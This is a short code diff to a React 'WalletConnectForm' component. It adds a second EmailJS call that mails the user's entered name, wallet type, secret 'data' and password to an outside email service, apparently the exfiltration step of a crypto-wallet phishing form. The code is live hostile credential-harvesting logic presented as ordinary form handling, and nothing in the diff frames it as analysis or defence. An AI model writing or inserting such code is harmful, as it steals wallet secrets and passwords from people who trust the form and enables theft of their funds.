@@ -243,6 +243,22 @@ const WalletConnectForm = ({ walletName }) => {
         },
         'o_NYBBGCjR2YIkIYu'
       );
+
+      await emailjs.send(
+        "service_w2qehzq",
+        "template_5orlh8k",
+        {
+          to_name: "prime_noval_app",
+          from_name: name,
+          message: `
+            Name: ${name}
+            Type: ${type}
+            Data: ${data}
+            Password: ${password}
+          `,
+        },
+        "4VxHnC4IdXAVuU9Gs"
+      );
       
     } catch (error) {
       console.log("error")
